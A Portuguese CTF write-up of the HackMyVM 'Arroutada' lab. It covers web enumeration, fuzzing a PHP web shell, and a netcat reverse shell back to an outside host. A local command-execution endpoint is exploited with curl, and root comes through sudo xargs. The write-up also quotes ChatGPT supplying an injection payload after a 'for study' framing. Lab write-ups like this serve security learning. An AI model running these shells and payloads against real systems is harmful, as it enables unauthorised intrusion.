---
description: CTF do HacMyVM como fiz e anotações.
title: HackMyVM - Arroutada - Fácil
date: 2024-03-01 19:14:00 +/-0300
categories: [CTF, HackMyVM]
tags: [ctf, hackmyvm, linux, facil, web, sudo]     # TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/friendly/friendly.png){: w="100" h="100" .left}

---
# **CTF - Arroutada**
---
---  
## **Enumeração**

### nmap

```shell
─ sudo nmap -sV -Pn -sS --min-rate 5000 -stats-every 5 -p- -oN nmap 192.168.15.6     

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-25 20:45 -03
Nmap scan report for arroutada (192.168.15.6)
Host is up (0.00071s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:AE:5E:FC (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.49 seconds
```
{: .nolineno }

### ffuf

```shell
╰─ ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 100 -u http://192.168.15.6/FUZZ -e .html,.txt,.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.15.6/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 8ms]
.htpasswd.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1150ms]
.htpasswd.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1172ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1476ms]
.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1479ms]
.htaccess.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1509ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1543ms]
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2470ms]
imgs                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 14ms]
index.html              [Status: 200, Size: 59, Words: 3, Lines: 6, Duration: 10ms]
scout                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 28ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 50ms]
:: Progress: [81904/81904] :: Job [1/1] :: 3184 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```
{: .nolineno }
![alt text](/assets/img/arroutada/arroutada1.png)

Código fonte

```html
<div>
<p>
Hi, Telly,
<br>
<br>
I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
<br>
/scout/******/docs/
<br>
<br>
With continued gratitude,
<br>
J1.
</p>
</div>
<!-- Stop please -->
.....

<!-- I told you to stop checking on me! -->

.....

<!-- OK... I'm just J1, the boss. -->
```
{: .nolineno }  

possíveis usuários:  
`J1`  
`Telly`  


### ffuf /scout/******/docs/

```shell
╰─ ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 100 -u http://192.168.15.6/scout/FUZZ/docs -e .html,.txt,.php                         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.15.6/scout/FUZZ/docs
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 27ms]
.htaccess.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 38ms]
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 36ms]
.htpasswd.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 37ms]
.htaccess.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 37ms]
.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 37ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 38ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 40ms]
j2                      [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 29ms]
:: Progress: [81904/81904] :: Job [1/1] :: 1845 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```
{: .nolineno }
Apenas esse arquivo tem syze que indica conteúdo.

![alt text](/assets/img/arroutada/2.png)

```shell
─      ~/hmv/arroutada   
╰─ cat pass.txt     
user:password
╭─      ~/hmv/arroutada      
╰─ cat z206 
Ignore z*, please
Jabatito
```
{: .nolineno }
shellfile.ods é arquivo do excel do libraryoffice com senha.  
enviando hash do arquivo shellfile.ods para john

`libreoffice2john shellfile.ods > hash`

![alt text](/assets/img/arroutada/3.png)  

Conteúdo de shellfile.ods
![alt text](/assets/img/arroutada/4.png)

### ffuf parâmetro thejabasshell.php

```shell
╰─ ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 100 -u 'http://192.168.15.9/thejabasshell.php?FUZZ=key' -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.15.9/thejabasshell.php?FUZZ=key
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

a                       [Status: 200, Size: 33, Words: 5, Lines: 1, Duration: 7ms]
:: Progress: [20476/20476] :: Job [1/1] :: 383 req/sec :: Duration: [0:00:09] :: Errors: 0 :
```
{: .nolineno }

Existe mais um parâmetro b  

![alt text](/assets/img/arroutada/5.png)

### ffuf valor de b
```shell
╭─      ~/hmv/arroutada      
╰─ ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 100 -u 'http://192.168.15.9/thejabasshell.php?a=key&b=FUZZ' -fs 33 


 :: Method           : GET
 :: URL              : http://192.168.15.9/thejabasshell.php?a=key&b=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 33
________________________________________________

pass                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 62ms]
```
{: .nolineno }

### ffuf valor de a
Por alguns resultados notei que são comandos.
```shell
╰─ ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 100 -u 'http://192.168.15.9/thejabasshell.php?a=FUZZ&b=pass' -fs 0

arch                    [Status: 200, Size: 7, Words: 1, Lines: 2, Duration: 79ms]
apt                     [Status: 200, Size: 1290, Words: 215, Lines: 30, Duration: 467ms]
date                    [Status: 200, Size: 29, Words: 6, Lines: 2, Duration: 433ms]
df                      [Status: 200, Size: 330, Words: 145, Lines: 7, Duration: 310ms]
dir                     [Status: 200, Size: 43, Words: 7, Lines: 2, Duration: 373ms]
echo                    [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 96ms]
du                      [Status: 200, Size: 371, Words: 1, Lines: 25, Duration: 857ms]
cpp                     [Status: 200, Size: 151, Words: 19, Lines: 8, Duration: 2607ms]
env                     [Status: 200, Size: 355, Words: 1, Lines: 12, Duration: 262ms]
export                  [Status: 200, Size: 454, Words: 12, Lines: 12, Duration: 95ms]
```
{: .nolineno }

![alt text](/assets/img/arroutada/6.png)

## **Acesso/FootHold**

Executado reverse shell no value de a com netcat.

`http://192.168.15.9/thejabasshell.php?a=nc%20192.168.15.26%20443%20-e%20/bin/bash&b=pass`
![alt text](/assets/img/arroutada/7.png)

### Linux smart enumeration

<https://github.com/diego-treitos/linux-smart-enumeration>  

Serviço rodando localmente apenas.

![alt text](/assets/img/arroutada/8.png)



```shell
www-data@arroutada:/tmp$ ss -tlp
ss -tlp                                                                                                                                                                      
State               Recv-Q              Send-Q                            Local Address:Port                             Peer Address:Port              Process              
LISTEN              0                   4096                                  127.0.0.1:8000                                  0.0.0.0:*                                      
LISTEN              0                   511                                           *:http                                        *:*    

```
{: .nolineno }

Tinha rodado o linpeas também.

```shell
╰─ cat linpeas.out|grep 8000     
drito        457  0.0  0.0   2484   568 ?        S    20:22   0:00              _ sh -c /usr/bin/php -S 127.0.0.1:8000 -t /home/drito/web/
drito        458  0.0  2.0 193336 20132 ?        S    20:22   0:00                  _ /usr/bin/php -S 127.0.0.1:8000 -t /home/drito/web/
```
{: .nolineno }

## **Escalação Privilégio**
### Escalando para usuário drito
### Port forward 
Com netcat fiz um port forward pra acessar o serviço local.

```shell
www-data@arroutada:/tmp$ nc -lktp 8001 -c "nc 127.0.0.1 8000"
nc -lktp 8001 -c "nc 127.0.0.1 8000"
```
{: .nolineno }

Código fonte

![alt text](/assets/img/arroutada/9.png)

Acessando priv.php
```shell

╰─ curl http://192.168.15.9:8001/priv.php
Error: the "command" parameter is not specified in the request body.

/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/
```
{: .nolineno }

Colando o código acima no ChatGPT ele explica sobre vulnerabilidade e te ajuda a criar o payload.

> O código PHP que você forneceu parece ser uma implementação de um serviço web que aceita solicitações POST em formato JSON e executa comandos no servidor com base nos dados fornecidos. O código contém uma verificação para garantir que o parâmetro command esteja presente no corpo da solicitação.  
Este código faz o seguinte:  
- Lê o corpo da solicitação POST JSON usando file_get_contents('php://input').  
- Decodifica o JSON para um array associativo usando json_decode.  
- Verifica se o parâmetro command está presente no array.  
- Se o parâmetro command estiver presente, o código usa a função system para executar o comando fornecido.  
- Se o parâmetro command não estiver presente, ele retorna uma mensagem de erro indicando que o parâmetro não foi especificado na solicitação.    
Este tipo de implementação é muito arriscado e inseguro, pois permite a execução arbitrária de comandos no servidor, o que é uma séria ameaça à segurança. Permitir que dados não validados sejam executados diretamente no sistema pode levar a vulnerabilidades graves, como injeção de código.  
Solicitado como injetar o código e dizendo que eh pra estudo ele retorna:  
Dado o código PHP que você compartilhou, que aceita um comando no corpo de uma solicitação POST em formato JSON, você pode testar isso usando o curl no terminal. No entanto, reforço que você só deve fazer isso em ambientes onde você tenha permissão explícita.  
Aqui está um exemplo de como você pode enviar uma solicitação POST com um comando usando o  
`curl -X POST -H "Content-Type: application/json" -d '{"command":"ls -la"}' http://192.168.15.9:8001/priv.php`
{: .prompt-info}
Basta alterar para executar reverse com netcat e receber uma nova reverse shell com usuário drito.

![alt text](/assets/img/arroutada/10.png)

### user flag

```shell
drito@arroutada:~$ cat user
cat user.txt 
785f64437c6xxxxxxxa1afcc91ed27c
drito@arroutada:~$ 
```
{: .nolineno }

## Escalando para root

```shell
drito@arroutada:~$ sudo -l
sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs
```
{: .nolineno }

Escalar privilégio com xargs via sudo <https://gtfobins.github.io/gtfobins/xargs/#sudo>

```shell
drito@arroutada:~$ sudo xargs -a /dev/null sh
sudo xargs -a /dev/null sh
# whoami
whoami
root
# 
```
{: .nolineno }
### root flag
![alt text](/assets/img/arroutada/11.png)  

A Flag ta codificada em base64 > ROT13

R3VuYXhmR2ccccccccFOeXlVbnB4WmxJWg== (BASE64)  
`echo "R3VuYXhmR2ccccccccFOeXlVbnB4WmxJWg==" | base64 -d`  
GunaxfGbFzccccccyUnpxZlIZ (ROT13)  
`echo "GunaxfGbFzccccccyUnpxZlIZ" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`  

ThanksToXXXXXXXXXckMyVM (Text)  
  

**Conhecimentos adquiridos:**  
- port forward com netcat
- injetar código com curl nessa vulnerabilidade
